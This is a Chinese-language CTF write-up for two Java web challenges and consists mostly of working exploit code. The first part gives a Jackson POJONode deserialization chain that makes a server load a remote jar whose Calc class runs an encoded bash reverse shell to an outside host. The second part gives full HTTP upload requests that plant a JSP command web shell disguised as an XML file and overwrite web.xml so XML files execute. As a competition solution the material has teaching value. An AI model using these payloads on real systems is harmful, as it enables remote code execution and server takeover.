+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&quot;java.lang.Runtime&quot;</span><br><span class="line">&quot;java.lang.ProcessBuilder&quot;</span><br><span class="line">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span><br><span class="line">&quot;java.security.SignedObject&quot;</span><br><span class="line">&quot;com.sun.jndi.ldap.LdapAttribute&quot;</span><br><span class="line">&quot;org.apache.commons.beanutils&quot;</span><br><span class="line">&quot;org.apache.commons.collections&quot;</span><br><span class="line">&quot;javax.management.BadAttributeValueExpException&quot;</span><br><span class="line">&quot;com.sun.org.apache.xpath.internal.objects.XString&quot;</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics93icymKp8dlpXovWXNCkv16DVh3JyibjI6Ae3vAD8EDbrysbvSSbaUU04PRE9BQcvaY6l8DsocMI3w/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1"
+                      alt="图片"
+                ></p>
+<p>在UserController类中，&#x2F;user&#x2F;ser接口会触发反序列化，不过由于使用了自定义的MyObjectInputStream，所以在写序列化数据时需要注意黑名单的问题</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics93icymKp8dlpXovWXNCkv16RIiaeyiaym1BZ4FuSQyO32CZibFCiaz2et6NC6jgtDum8ymXTMEaZJ8fIg/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1"
+                      alt="图片"
+                ></p>
+<p>&#x2F;user&#x2F;upload路由还存在文件上传的点，过滤了jsp后缀文件（实际上是多余的）</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics93icymKp8dlpXovWXNCkv16ml1xXXUCT9lGuNYXF9EYZRlBxjGjD3IYvUdS2qicfx8tCRm0HQvtuBQ/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1"
+                      alt="图片"
+                ></p>
+<p>接下来看shiro部分，一开始看到shiro以为是需要权限绕过，虽然这题shiro版本比较低，但是相关路径匹配都做的比较死，所以没法直接绕过</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics93icymKp8dlpXovWXNCkv16YIPQV1fiaumWVSoI1q6WS0yJpyb3H58iaqpSlX531aCvOG8rb6CbxC1w/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1"
+                      alt="图片"
+                ></p>
+<p>注意到在User类里给了提示，username为admin、password为admin888</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics93icymKp8dlpXovWXNCkv16ibIiam56VVat3TVTojyRHD8WUVicIEYWU3Ly9ABd36WV5yMYeiaGWucKoA/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1"
+                      alt="图片"
+                ></p>
+<p>那这题如何构造序列化链呢？</p>
+<p>User类存在getGift方法，虽然过滤了协议，但是是通过startsWith方式过滤的，所以存在绕过的可能，下方代码通过反射的方式调用了URLClassLoader#addURL(this.username)方法</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics93icymKp8dlpXovWXNCkv16YMeiaAKPiaJBlUexA1vgRaPmrCXAdJPsVIsr3p54icsw1pf9m5gk51Y6g/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1"
+                      alt="图片"
+                ></p>
+<p>URLClassLoader#addURL(this.username)的用法可以参考下方代码，其中<code>jar:http://</code>是为了绕过上方startsWith对协议的判断。注意：执行完<code>add.invoke(classloader, url1);</code>并不会直接去加载远程的jar包，而是需要等到下一次请求类加载器找不到类的时候，才会去远程去找</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import java.lang.reflect.Method;</span><br><span class="line">import java.net.URL;</span><br><span class="line">import java.net.URLClassLoader;</span><br><span class="line"></span><br><span class="line">public class URLClassLoaderAddURLTest &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line">        String gift = &quot;jar:http://127.0.0.1:12345/calc.jar!/&quot;;</span><br><span class="line">        URL url1 = new URL(gift);</span><br><span class="line">        Class&lt;?&gt; URLclass = Class.forName(&quot;java.net.URLClassLoader&quot;);</span><br><span class="line">        Method add = URLclass.getDeclaredMethod(&quot;addURL&quot;, URL.class);</span><br><span class="line">        add.setAccessible(true);</span><br><span class="line">        URLClassLoader classloader = (URLClassLoader)ClassLoader.getSystemClassLoader();</span><br><span class="line">        add.invoke(classloader, url1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>其中calc.jar的制作方式如下：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jar -cvf Calc.jar Calc.class</span><br><span class="line">mv Calc.jar calc.jar</span><br></pre></td></tr></table></figure></div>
+
+<p>那么我们目前的攻击思路是：</p>
+<ol>
+<li>本地构造一个Calc类，让这个类的static、readObject方法里放上反弹shell的代码</li>
+<li>利用admin、admin888登录到后台</li>
+<li>通过&#x2F;user&#x2F;ser接口反序列化触发User#getGift方法，把远程jar包路径添加到URLClassLoader里</li>
+<li>再次通过&#x2F;user&#x2F;ser接口触发Calc类的反序列化，此时服务器默认不存在Calc类，但是会去远程jar包里找，最终初始化Calc类完成反弹shell</li>
+</ol>
+<p>编写如下Calc类：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line">import java.io.Serializable;</span><br><span class="line"></span><br><span class="line">public class Calc implements Serializable &#123;</span><br><span class="line">    static String code = &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjEuMS4xLzc3NzcgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;;</span><br><span class="line">    static &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime.getRuntime().exec(code);</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            throw new RuntimeException(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private void readObject(ObjectInputStream in) throws Exception &#123;</span><br><span class="line">        Runtime.getRuntime().exec(code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>编译Calc类并打包成jar包：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">javac Calc.java</span><br><span class="line">jar -cvf Calc.jar Calc.class</span><br><span class="line">mv Calc.jar calc.jar</span><br></pre></td></tr></table></figure></div>
+
+<p>至此，前两步已经完成了，接下来的问题是：如何触发User#getGift方法？</p>
+<p>插个广告：还在为找不到合适的Java Gadget而烦恼？还在为出题人禁用各种常用类而烦恼？快来CTF-Java-Gadget看看吧，CTF-Java-Gadget专注于收集CTF中Java赛题的反序列化片段，速速上线star！</p>
+<ul>
+<li><a class="link"   target="_blank" rel="noopener" href="https://github.com/LxxxSec/CTF-Java-Gadget" >https://github.com/LxxxSec/CTF-Java-Gadget <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+</ul>
+<p>第一反应应该是通过BadAttributeValueExpException#readObject -&gt; POJONode#toString -&gt; getter</p>
+<p>但是BadAttributeValueExpException被过滤了，所以可以通过HashMap的方式调用POJONode#toString进而触发getter</p>
+<p>第一个EXP如下：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">import com.example.ycbjava.bean.User;</span><br><span class="line">import com.fasterxml.jackson.databind.node.POJONode;</span><br><span class="line">import javassist.ClassPool;</span><br><span class="line">import javassist.CtClass;</span><br><span class="line">import javassist.CtMethod;</span><br><span class="line">import sun.misc.Unsafe;</span><br><span class="line"></span><br><span class="line">import java.io.ByteArrayOutputStream;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.util.Base64;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class Easyjava_1 &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line">        User user = new User();</span><br><span class="line">        user.setUsername(&quot;jar:http://1.1.1.1:12345/Calc.jar!/&quot;);</span><br><span class="line">        // 删除 BaseJsonNode#writeReplace 方法用于顺利序列化</span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        CtClass ctClass0 = pool.get(&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;);</span><br><span class="line">        CtMethod writeReplace = ctClass0.getDeclaredMethod(&quot;writeReplace&quot;);</span><br><span class="line">        ctClass0.removeMethod(writeReplace);</span><br><span class="line">        ctClass0.toClass();</span><br><span class="line"></span><br><span class="line">        POJONode node = new POJONode(user);</span><br><span class="line"></span><br><span class="line">        HashMap hashMap = makeHashMapByTextAndMnemonicHashMap(node);</span><br><span class="line"></span><br><span class="line">        byte[] bytes = serialize(hashMap);</span><br><span class="line">        System.out.println(Base64.getEncoder().encodeToString(bytes));</span><br><span class="line">    &#125;</span><br><span class="line">    public static byte[] serialize(Object obj) throws IOException &#123;</span><br><span class="line">        ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(baos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        return baos.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line">    public static HashMap makeHashMapByTextAndMnemonicHashMap(Object toStringClass) throws Exception&#123;</span><br><span class="line">        Map tHashMap1 = (Map) getObjectByUnsafe(Class.forName(&quot;javax.swing.UIDefaults$TextAndMnemonicHashMap&quot;));</span><br><span class="line">        Map tHashMap2 = (Map) getObjectByUnsafe(Class.forName(&quot;javax.swing.UIDefaults$TextAndMnemonicHashMap&quot;));</span><br><span class="line">        tHashMap1.put(toStringClass, &quot;123&quot;);</span><br><span class="line">        tHashMap2.put(toStringClass, &quot;12&quot;);</span><br><span class="line">        setFieldValue(tHashMap1, &quot;loadFactor&quot;, 1);</span><br><span class="line">        setFieldValue(tHashMap2, &quot;loadFactor&quot;, 1);</span><br><span class="line">        HashMap hashMap = new HashMap();</span><br><span class="line">        hashMap.put(tHashMap1,&quot;1&quot;);</span><br><span class="line">        hashMap.put(tHashMap2,&quot;1&quot;);</span><br><span class="line"></span><br><span class="line">        tHashMap1.put(toStringClass, null);</span><br><span class="line">        tHashMap2.put(toStringClass, null);</span><br><span class="line">        return hashMap;</span><br><span class="line">    &#125;</span><br><span class="line">    public static Object getObjectByUnsafe(Class clazz) throws Exception&#123;</span><br><span class="line">        Field theUnsafe = Unsafe.class.getDeclaredField(&quot;theUnsafe&quot;);</span><br><span class="line">        theUnsafe.setAccessible(true);</span><br><span class="line">        Unsafe unsafe = (Unsafe) theUnsafe.get(null);</span><br><span class="line">        return unsafe.allocateInstance(clazz);</span><br><span class="line">    &#125;</span><br><span class="line">    public static void setFieldValue(Object obj, String key, Object val) throws Exception&#123;</span><br><span class="line">        Field field = null;</span><br><span class="line">        Class clazz = obj.getClass();</span><br><span class="line">        while (true)&#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                field = clazz.getDeclaredField(key);</span><br><span class="line">                break;</span><br><span class="line">            &#125; catch (NoSuchFieldException e)&#123;</span><br><span class="line">                clazz = clazz.getSuperclass();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        field.setAccessible(true);</span><br><span class="line">        field.set(obj, val);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>发送给&#x2F;user&#x2F;ser，这时候服务器会“新增”找远程jar包中的类</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics93icymKp8dlpXovWXNCkv16Ud6iayrVaLjeQ9dvP5azmVyVyrAXfbQDv8hsoFyxDHfXA67706Bt74g/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1"
+                      alt="图片"
+                ></p>
+<p>再序列化Calc类，将序列化结果发送至&#x2F;user&#x2F;ser接口</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import java.io.ByteArrayOutputStream;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">import java.util.Base64;</span><br><span class="line"></span><br><span class="line">public class Easyjava_2 &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line">        Calc calc = new Calc();</span><br><span class="line">        byte[] bytes = serialize(calc);</span><br><span class="line">        System.out.println(Base64.getEncoder().encodeToString(bytes));</span><br><span class="line">    &#125;</span><br><span class="line">    public static byte[] serialize(Object obj) throws IOException &#123;</span><br><span class="line">        ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(baos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        return baos.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics93icymKp8dlpXovWXNCkv16uzBAKcYb0bWiatDObxF9sT44FhwTic86kPCvzCSdn4IzhrO3ypibUNWgQ/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1"
+                      alt="图片"
+                ></p>
+<p>此时服务器找不到Calc类，就回去远程找，最终加载Calc类实现命令执行</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics93icymKp8dlpXovWXNCkv16dgNIOyu2WlpZQ4Syoa6bxmRw2NYSKQSyu3XZmd9REzbO7n5rkJibiauw/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1"
+                      alt="图片"
+                ></p>
+<p>反弹shell结果如下：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics93icymKp8dlpXovWXNCkv16XJnxpoMHzPRbqabG4P4b5LDh6gkibcKqzf6J6UBiaSTk4Eawswic3p21A/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1"
+                      alt="图片"
+                ></p>
+<h2 id="tomtom2"><a href="#tomtom2" class="headerlink" title="tomtom2"></a>tomtom2</h2><p>可以读xml文件，读&#x2F;opt&#x2F;tomcat&#x2F;conf&#x2F;tomcat-users.xml，找到用户名密码</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mmbiz.qpic.cn/mmbiz_png/vTLDcxb9m5FpqAuqvUnmVN1N5ChH7qRdot0d0LdgUdiamPPGDfUyc9eEOaadtmLbsnbU05IcU15emAFoZCAekAw/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1"
+                      alt="图片"
+                ></p>
+<p>web.xml不给读</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mmbiz.qpic.cn/mmbiz_png/vTLDcxb9m5FpqAuqvUnmVN1N5ChH7qRdV68N0BGmD76DVOKe3xX8e52Um2gpTyKcKhpmWnjFLA6ezORV0wwN9Q/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1"
+                      alt="图片"
+                ></p>
+<p>先登录</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:\Users\27284\AppData\Roaming\Typora\typora-user-images\image-20250812133539446.png"
+                      alt="image-20250812133539446"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:\Users\27284\AppData\Roaming\Typora\typora-user-images\image-20250812133237053.png"
+                      alt="image-20250812133237053"
+                ></p>
+<p>可以上传xml文件，先传一个jsp马，后缀改成xml</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">POST /myapp/upload?path= HTTP/1.1</span><br><span class="line">Host: 139.155.126.78:30360</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------304730960928352033723778958183</span><br><span class="line">Content-Length: 1064</span><br><span class="line">Origin: http://139.155.126.78:30360</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://139.155.126.78:30360/myapp/upload.html</span><br><span class="line">Cookie: JSESSIONID=17BC2AFA5FC312B43A2FC14E73F8DC5B</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Priority: u=0, i</span><br><span class="line"></span><br><span class="line">-----------------------------304730960928352033723778958183</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.xml&quot;</span><br><span class="line">Content-Type: text/xml</span><br><span class="line"></span><br><span class="line">&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.io.ByteArrayOutputStream&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;org.apache.catalina.Wrapper&quot; %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    InputStream inputStream = Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;)).getInputStream();</span><br><span class="line">    byte[] myChunk = new byte[1024];</span><br><span class="line">    int i = 0;</span><br><span class="line">    ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();</span><br><span class="line">    while ((i = inputStream.read(myChunk)) != -1) &#123;</span><br><span class="line">        byteArrayOutputStream.write(myChunk, 0, i);</span><br><span class="line">    &#125;</span><br><span class="line">    out.println(new String(byteArrayOutputStream.toByteArray()));</span><br><span class="line">%&gt;</span><br><span class="line">-----------------------------304730960928352033723778958183--</span><br></pre></td></tr></table></figure></div>
+
+
+<p>再上传一个web.xml覆盖原来，将xml文件也解析成jsp，path改成WEB-INF</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">POST /myapp/upload?path=WEB-INF HTTP/1.1</span><br><span class="line">Host: 139.155.126.78:30360</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------304730960928352033723778958183</span><br><span class="line">Content-Length: 863</span><br><span class="line">Origin: http://139.155.126.78:30360</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://139.155.126.78:30360/myapp/upload.html</span><br><span class="line">Cookie: JSESSIONID=17BC2AFA5FC312B43A2FC14E73F8DC5B</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Priority: u=0, i</span><br><span class="line"></span><br><span class="line">-----------------------------304730960928352033723778958183</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;web.xml&quot;</span><br><span class="line">Content-Type: text/xml</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;web-app xmlns=&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span><br><span class="line">         xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">         xsi:schemaLocation=&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span><br><span class="line">         version=&quot;4.0&quot;&gt;</span><br><span class="line">    &lt;servlet&gt;</span><br><span class="line">        &lt;servlet-name&gt;jsp&lt;/servlet-name&gt;</span><br><span class="line">        &lt;servlet-class&gt;org.apache.jasper.servlet.JspServlet&lt;/servlet-class&gt;</span><br><span class="line">        &lt;init-param&gt;</span><br><span class="line">            &lt;param-name&gt;fork&lt;/param-name&gt;</span><br><span class="line">            &lt;param-value&gt;false&lt;/param-value&gt;</span><br><span class="line">        &lt;/init-param&gt;</span><br><span class="line">        &lt;init-param&gt;</span><br><span class="line">            &lt;param-name&gt;xpoweredBy&lt;/param-name&gt;</span><br><span class="line">            &lt;param-value&gt;false&lt;/param-value&gt;</span><br><span class="line">        &lt;/init-param&gt;</span><br><span class="line">        &lt;load-on-startup&gt;3&lt;/load-on-startup&gt;</span><br><span class="line">    &lt;/servlet&gt;</span><br><span class="line">    &lt;servlet-mapping&gt;</span><br><span class="line">        &lt;servlet-name&gt;jsp&lt;/servlet-name&gt;</span><br><span class="line">        &lt;url-pattern&gt;*.xml&lt;/url-pattern&gt;</span><br><span class="line">        &lt;url-pattern&gt;*.txt&lt;/url-pattern&gt;</span><br><span class="line">        &lt;url-pattern&gt;*.jsp&lt;/url-pattern&gt;</span><br><span class="line">        &lt;url-pattern&gt;*.jspx&lt;/url-pattern&gt;</span><br><span class="line">    &lt;/servlet-mapping&gt;</span><br><span class="line">&lt;/web-app&gt;</span><br><span class="line">-----------------------------304730960928352033723778958183--</span><br></pre></td></tr></table></figure></div>
+
+<p>再次访问1.xml即可getshell</p>
